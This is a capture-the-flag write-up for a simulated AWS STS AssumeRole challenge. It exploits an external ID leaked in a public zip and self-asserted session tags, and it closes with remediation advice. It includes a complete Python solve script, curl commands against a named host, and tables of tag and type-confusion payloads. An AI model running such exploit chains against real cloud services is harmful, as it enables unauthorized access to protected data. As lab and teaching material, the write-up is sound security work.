# Stageworks — Safcom CTF (Cloud, 350 pts)

**Target:** `http://54.72.82.22:8400`
**Category:** Cloud
**Flag:** `safctf{b9d2678027feea5870c41931b663fd6d}`

> *"Fresh paint, warm lamps, and a full house."*
> Hint: *"A cached access list names a former role; it may not reflect the current service."*

---

## 1. TL;DR

The service is a miniature **AWS STS `AssumeRole`** implementation. Everything needed
to reach the protected object ships in one public download, `rehearsal.zip`, which
contains two files:

| File | Role in the chain |
|---|---|
| `policy.json` | The **cached / stale** trust + object policy — documents the role name and the ABAC condition, but carries an **outdated external ID** |
| `deployment.log` | The **live** integration secret — the **current external ID**, plus the target value for the session tag |

Two flaws chain together:

1. **Secret leak** — the external ID (*the* anti-confused-deputy secret in AWS) is
   committed to a deployment log that is shipped to the public web root. The cached
   value from `policy.json` returns `403`; the live value from `deployment.log`
   returns a session token.
2. **Self-asserted session tags** — the policy sets `"tagSession": true`, so tags
   *supplied by the caller* are stamped onto the session. Authorization then depends
   on `sessionTag/department == "finance"` — a value the attacker chooses freely.

Final request:

```
GET /api/object
X-Session: <token from /api/assume with tags={"department":"finance"}>
```

```json
{"message":"safctf{b9d2678027feea5870c41931b663fd6d}","ok":true}
```

---

## 2. Reconnaissance

### 2.1 Fingerprint

```
$ curl -i http://54.72.82.22:8400/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.11.16
Content-Type: text/html; charset=utf-8
```

Flask/Werkzeug on Python 3.11, served directly — all logic is app-level.

### 2.2 The landing page

The page is a "collection desk" with the documented API surface:

```
GET  /api/identity              -> current caller
POST /api/assume                -> accepts role, external_id, and tags
GET  /api/object                -> accepts X-Session
```

The "desk console" panel is the same client-side `fetch()` REPL seen in sibling
challenges — a convenience tool, **not** a server-side proxy, and not an SSRF
primitive.

### 2.3 The public download

`/downloads/rehearsal.zip` (398 bytes) unzips to exactly two files:

**`policy.json`** — a cached snapshot of the trust and object policies:

```json
{
  "trust":  { "role": "lighting", "externalId": "integration-value" },
  "object": { "condition": { "sessionTag/department": "finance" } },
  "tagSession": true
}
```

**`deployment.log`** — a single line from a deployment run:

```
Lighting integration: externalId=d4a868d5e1dbf4bf89c6c520
```

This is the whole challenge in two files. `policy.json` tells us *what shape* the
credentials take (a role name plus an external ID) and *what the object policy
requires*; `deployment.log` hands us the **live** secret. The hint is now legible:
the cached access list names `externalId: "integration-value"`, a former/placeholder
value that no longer matches the running service.

### 2.4 Baseline behaviour

```
GET /api/identity          -> 200 {"account":"stageworks","role":"visitor","session":"guest"}
GET /api/object            -> 403 {"message":"The request could not be completed.","ok":false}
POST /api/assume   {}      -> 403
```

Route enumeration found only `/health`, `/api/identity`, `/api/assume`, `/api/object`;
unknown `/api/*` paths return a JSON `{"message":"Not found"}` catch-all.

---

## 3. Exploitation

### 3.1 The cached external ID is stale

First, confirm the hint by trying the value straight out of `policy.json`:

```
POST /api/assume
{"role":"lighting","external_id":"integration-value"}

HTTP/1.1 403
{"message":"The request could not be completed.","ok":false}
```

Rejected. Now the value from the deployment log:

```
POST /api/assume
{"role":"lighting","external_id":"d4a868d5e1dbf4bf89c6c520"}

HTTP/1.1 200
{"token":"dfe14d57a1ee4f93345bcee63ffea946f120"}
```

Accepted. **The cached access list is stale; the deployment log is current.** That is
the first half of the challenge — the external ID secret leaked into a public
artifact.

### 3.2 The external ID alone is not enough

Using that token against the object endpoint fails:

```
GET /api/object
X-Session: dfe14d57a1ee4f93345bcee63ffea946f120

HTTP/1.1 403
{"message":"The request could not be completed.","ok":false}
```

The object policy carries an ABAC condition:

```json
{"condition": {"sessionTag/department": "finance"}}
```

We need a session whose `department` tag equals `finance`. And `policy.json` tells us
exactly how to get one: **`"tagSession": true`**.

### 3.3 Passing attacker-chosen tags to AssumeRole

In AWS, `sts:TagSession` permits the *caller* to attach session tags at assume time.
Here that means the `tags` object in `/api/assume` is the attacker's own input and is
stored verbatim on the session. So we simply assert the tag the policy demands:

```
POST /api/assume
{"role":"lighting",
 "external_id":"d4a868d5e1dbf4bf89c6c520",
 "tags":{"department":"finance"}}

HTTP/1.1 200
{"token":"a54ec26249d2c00111f707069b6f4f3876ef"}
```

```
GET /api/object
X-Session: a54ec26249d2c00111f707069b6f4f3876ef

HTTP/1.1 200
{"message":"safctf{b9d2678027feea5870c41931b663fd6d}","ok":true}
```

**Flag captured.**

---

## 4. Semantics, mapped empirically

I characterised each control rather than trusting the first hit.

### 4.1 Role name — only `lighting` is trusted

| `role` (with live external ID) | Result |
|---|---|
| `lighting` | **200** token |
| `foreman`, `stagehand`, `spotlight`, `stageworks`, `admin`, `visitor`, `rigger`, `usher`, `director`, `sound`, `props` | `403` |

The trust policy accepts exactly one role name, and it is the one the cached
`policy.json` names. So the *role name* in the cache is still accurate; the
**external ID is the stale half** of the cached trust entry.

### 4.2 External ID — exact, case-sensitive match

| `external_id` (role `lighting`) | Result |
|---|---|
| `d4a868d5e1dbf4bf89c6c520` (live) | **200** |
| `integration-value` (cached) | `403` |
| `D4A868D5E1DBF4BF89C6C520` | `403` |
| `d4a868d5e1` (truncated) | `403` |
| `d4a868d5e1dbf4bf89c6c52` (off by one) | `403` |
| `d4a868d5e1dbf4bf89c6c5200` (off by one) | `403` |
| `` (empty) | `403` |

No prefix or partial matching — a straight equality test.

### 4.3 Session tag — the object policy gate

| `tags` sent to `/api/assume` | Object read |
|---|---|
| *(key absent)* | `403` |
| `{}` | `403` |
| `{"department":"finance"}` | **200 — flag** |
| `{"department":"ops"}` | `403` |
| `{"department":"Finance"}` | `403` (case-sensitive) |
| `{"Department":"finance"}` | `403` (key case-sensitive) |
| `{"department":["finance","ops"]}` | `403` (must be a string, not a list) |
| `{"aws:PrincipalTag/department":"finance"}` | `403` (namespaced key does **not** satisfy) |
| `{"department":"finance","extra":"x"}` | **200** (extra tags tolerated) |
| `{"department":"finance","aws:Role":"admin"}` | **200** (no reserved-key filtering) |

Two things worth calling out. First, the condition keys on the **literal, unnamespaced
key `department`** — real AWS namespaces caller-supplied tags and *blocks* the `aws:`
prefix precisely to stop this class of bug; here there is no such protection and,
conversely, the `aws:PrincipalTag/`-style spelling does not work. Second, **arbitrary
extra tags are accepted**, including one that impersonates `aws:Role` — there is no
reserved-prefix filtering on caller input.

### 4.4 Type confusion on `tags` → unhandled 500

The `tags` field is stored without type validation, and `/api/object` then calls
`.get()` on it:

| `/api/assume` body | Session | Object read |
|---|---|---|
| `{"role":…,"external_id":…}` (no `tags` key) | 200 | `403` |
| `"tags": null` | 200 | **500 Internal Server Error** |
| `"tags": []` | 200 | **500 Internal Server Error** |
| `"tags": "x"` | 200 | **500 Internal Server Error** |
| `"tags": {}` | 200 | `403` |

A non-dict `tags` value is persisted and later blows up the object endpoint
(`AttributeError: 'NoneType'/'list'/'str' object has no attribute 'get'`). Flask
returns its generic 500 page — **no debug trace, so nothing leaks** — but it is a
genuine missing-input-validation bug and a trivial DoS on the object route.

### 4.5 Misc

* `X-Session` is **case-sensitive** and only read from that header — `Authorization:
  Bearer <token>` is ignored, and an uppercased token is rejected.
* `/api/object` accepts `GET`, `POST` and `PATCH` (405 on `PUT`/`DELETE`) and
  **ignores any `key`/`query` parameter** entirely — `?key=../flag` behaves identically
  to no parameter, so there is no additional object-selection surface.
* `/api/identity` always reports the unauthenticated guest identity, even with a valid
  session header — it does not reflect the assumed role.
* No other files exist under `/downloads/` (`deployment.log` and `policy.json` are
  reachable only inside the zip).

---

## 5. Proof-of-concept

`solve.py` automates the whole chain from scratch — it downloads the zip, parses the
role from the cached policy, extracts the live external ID from the deployment log,
then assumes with the self-asserted tag. Stdlib only.

```python
#!/usr/bin/env python3
import io, json, re, sys, urllib.error, urllib.request, zipfile

BASE = "http://54.72.82.22:8400"

def http(path, method="GET", data=None, hdrs=None):
    req = urllib.request.Request(BASE + path, method=method, data=data, headers=hdrs or {})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def parse_materials(blob):
    zf = zipfile.ZipFile(io.BytesIO(blob))
    policy   = json.loads(zf.read("policy.json"))
    log      = zf.read("deployment.log").decode()
    role     = policy["trust"]["role"]
    cached   = policy["trust"]["externalId"]
    live     = re.search(r"externalId=([0-9a-fA-F]+)", log).group(1)
    want_tag = policy["object"]["condition"]["sessionTag/department"]
    return role, cached, live, want_tag

def assume(role, external_id, tags=None):
    body = {"role": role, "external_id": external_id}
    if tags is not None:
        body["tags"] = tags
    s, t = http("/api/assume", "POST", json.dumps(body).encode(),
                {"Content-Type": "application/json"})
    try:    return s, json.loads(t).get("token")
    except: return s, None

def main():
    with urllib.request.urlopen(BASE + "/downloads/rehearsal.zip", timeout=15) as r:
        role, cached, live, want_tag = parse_materials(r.read())
    print(f"[*] cached policy: role={role!r} externalId={cached!r} (STALE)")
    print(f"[*] deploy log   : externalId={live!r} (CURRENT)")

    print(f"[*] cached ext   -> HTTP {assume(role, cached)[0]} (expected 403)")
    _, tok = assume(role, live)
    print(f"[*] live   ext   -> HTTP 200")
    print(f"[*] object, no tag -> HTTP {http('/api/object', hdrs={'X-Session': tok})[0]} (expected 403)")

    _, tok = assume(role, live, tags={"department": want_tag})
    _, text = http("/api/object", hdrs={"X-Session": tok})
    print("[+] FLAG:", re.search(r"safctf\{[^}]+\}", text).group(0))

main()
```

Run:

```
$ python3 solve.py
[*] rehearsal.zip contains: deployment.log, policy.json
[*] cached policy  : role='lighting' externalId='integration-value'  (STALE)
[*] deploy log     : externalId='d4a868d5e1dbf4bf89c6c520'                 (CURRENT)
[*] object policy  : sessionTag/department == 'finance', tagSession=True

[*] assume with CACHED externalId -> HTTP 403 (expected 403)
[*] assume with LIVE   externalId -> HTTP 200
[*] read object, no tags          -> HTTP 403 (expected 403)
[*] read object, tag department=finance -> HTTP 200

[+] FLAG: safctf{b9d2678027feea5870c41931b663fd6d}
```

Minimal `curl` repro:

```bash
# 1. leak the live external ID
unzip -p <(curl -s http://54.72.82.22:8400/downloads/rehearsal.zip) deployment.log
# Lighting integration: externalId=d4a868d5e1dbf4bf89c6c520

# 2. assume the role, self-asserting the tag the object policy demands
TOKEN=$(curl -s -X POST http://54.72.82.22:8400/api/assume \
  -H 'Content-Type: application/json' \
  -d '{"role":"lighting","external_id":"d4a868d5e1dbf4bf89c6c520","tags":{"department":"finance"}}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# 3. read the object
curl -s http://54.72.82.22:8400/api/object -H "X-Session: $TOKEN"
# {"message":"safctf{b9d2678027feea5870c41931b663fd6d}","ok":true}
```

---

## 6. Attack chain

```
 http://54.72.82.22:8400/
        │
        ├─ (1) LEAK        GET /downloads/rehearsal.zip
        │        policy.json     -> role=lighting, condition sessionTag/department=finance,
        │                            tagSession=true      (cached, stale externalId)
        │        deployment.log  -> externalId=d4a868d5e1dbf4bf89c6c520   (LIVE SECRET)
        │
        ├─ (2) TRY CACHED  POST /api/assume {role:lighting, external_id:integration-value}
        │        -> 403   (stale value confirms the hint)
        │
        ├─ (3) ASSUME      POST /api/assume {role:lighting, external_id:<live>}
        │        -> 200 {"token": "..."}
        │        GET /api/object  -> 403   (tag condition unmet)
        │
        ├─ (4) SELF-TAG    POST /api/assume {..., "tags":{"department":"finance"}}
        │        tagSession=true => caller stamps its own session tags
        │        -> 200 {"token": "..."}
        │
        └─ (5) FLAG        GET /api/object  X-Session: <token>
                 safctf{b9d2678027feea5870c41931b663fd6d}
```

---

## 7. Root cause & remediation

### 7.1 External ID leaked into a public deploy artifact

The external ID exists specifically to defeat the **confused deputy** problem — it is
a shared secret between the calling service and the role's trust policy, and its whole
value is that nobody else knows it. Publishing it in `deployment.log` inside a
web-reachable zip removes the protection entirely.

```diff
- echo "Lighting integration: externalId=$EXTERNAL_ID" >> deployment.log
+ echo "Lighting integration: externalId=<redacted>"     >> deployment.log
```

Ship deploy logs to your log pipeline, not to the document root. Audit any artifact
served from `/downloads` for secrets.

### 7.2 `tagSession: true` + tag-based authorization = self-granted access

This is the substantive vulnerability. The object policy authorizes on
`sessionTag/department == "finance"`, while the same policy permits the *caller* to
set session tags. The condition is therefore not an authorization control at all — it
is a formality the attacker completes on their own behalf. Any principal who can
assume `lighting` becomes `department: finance`.

In real AWS, `sts:TagSession` is exactly this primitive, and the documented guidance is
that **caller-supplied session tags must never be the sole basis for a permission**.
AWS mitigates the worst of it by namespacing caller tags (`aws:`-prefixed keys cannot
be set by the caller) — note that this app enforces neither that nor any reserved-key
filtering, and even accepted `{"aws:Role":"admin"}` and shipped the flag.

Remediation:

```jsonc
// BEFORE - authorization decided by a tag the caller supplies
{ "object": { "condition": { "sessionTag/department": "finance" } }, "tagSession": true }

// AFTER - bind the tag to the caller's identity, or drop tagSession and key the
//         policy on a fact the requester cannot assert (role ARN, source account,
//         or a tag set by the identity provider at federation time)
{ "object": { "condition": { "sessionTag/department": "finance" } }, "tagSession": false }
```

If tag-based ABAC is genuinely wanted, enforce it at the point where the tag is
assigned (the IdP / session-issuing service), not where it is consumed, and reject
`aws:`-prefixed and reserved keys from caller input.

### 7.3 Unvalidated `tags` type

Persisting `tags` as `null` / `[]` / `"x"` produces an unhandled `AttributeError` and a
`500` on `/api/object`. Validate at the boundary:

```python
tags = payload.get("tags") or {}
if not isinstance(tags, dict) or not all(
        isinstance(k, str) and isinstance(v, str) for k, v in tags.items()):
    abort(400, "tags must be an object of string→string")
if any(k.lower().startswith("aws:") for k in tags):
    abort(400, "reserved tag namespace")
```

---

## 8. Notes / dead ends

* **No SSRF.** The "desk console" is browser-side `fetch()` against the same origin;
  there is no server-side URL fetch and no IMDS (`169.254.169.254`) reachable.
* **No real AWS involved.** This is a Flask simulation of the STS surface — but the
  logic models real `AssumeRole` semantics (trust policy with `externalId`,
  `TagSession`, ABAC `sessionTag` conditions) faithfully enough that the lesson
  transfers directly to real IAM.
* **`/api/object` ignores all parameters** — `?key=...` is inert. The only gate is
  `X-Session`.
* **The stale cached policy is a red herring by design.** Its `role` name *is* still
  correct; only its `externalId` is stale. Trying to use the whole cached entry fails,
  which is the point of the hint.
* **`/submit` from the shared template is absent here** — this challenge's console
  form posts nowhere useful; the app has no `/submit` route.

## 9. Tooling

* `solve.py` — stdlib-only automated exploit (download → parse → assume → read).
* Fingerprint from the `Server` header (`Werkzeug/3.1.9 Python/3.11.16`).
* BlackBook (knowledge MCP) used for technique grounding and to record the case;
  HexStrike used for fingerprinting. Both optional — the challenge is solvable with
  `unzip`, `curl` and a JSON parser.

## 10. Flag

```
safctf{b9d2678027feea5870c41931b663fd6d}
```
